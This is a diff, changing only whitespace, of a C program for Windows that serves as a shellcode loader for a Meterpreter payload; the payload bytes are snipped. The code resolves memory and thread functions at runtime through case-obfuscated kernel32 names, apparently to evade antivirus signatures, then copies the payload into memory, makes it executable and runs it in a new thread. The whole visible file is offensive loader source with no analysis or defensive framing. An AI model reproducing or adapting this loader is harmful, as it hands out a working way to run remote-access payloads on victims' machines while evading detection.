@@ -17,25 +17,25 @@ int main(VOID) {
 	//plain meterpreter payload
 	//[...payload snipped for size]
 	size_t payload_len = sizeof(payload);
-	
+
 	void * exec_mem;
 	BOOL rv;
 	HANDLE th;
 	DWORD oldprotect = 0;
-		
-		
+
+
 	//function pointers
 	VirtualAlloc_t VirtualAlloc_p = (VirtualAlloc_t) GetProcAddress(GetModuleHandle((LPCSTR) "KErnEl32.DLl"), (LPCSTR) sVirtualAlloc);
 	VirtualProtect_t VirtualProtect_p = (VirtualProtect_t) GetProcAddress(GetModuleHandle((LPCSTR) "kErnEl32.DLl"), (LPCSTR) sVirtualProtect);
 	CreateThread_t CreateThread_p = (CreateThread_t) GetProcAddress(GetModuleHandle((LPCSTR) "kERnEl32.DLl"), (LPCSTR) sCreateThread);
-		
-		
+
+
 	// Allocate a memory buffer for payload
 	exec_mem = VirtualAlloc_p(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
 	// Copy payload to program memory ; this gets inlined
 	RtlMoveMemory(exec_mem, payload, payload_len);
-	
+
 	// Make payload executable
 	rv = VirtualProtect_p(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
 
@@ -46,8 +46,8 @@ int main(VOID) {
 	if ( rv != 0 ) {
 		th = CreateThread_p(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
 		WaitForSingleObject(th, INFINITE);
-				
+
 	}
-			
+
 	return 0;
 }
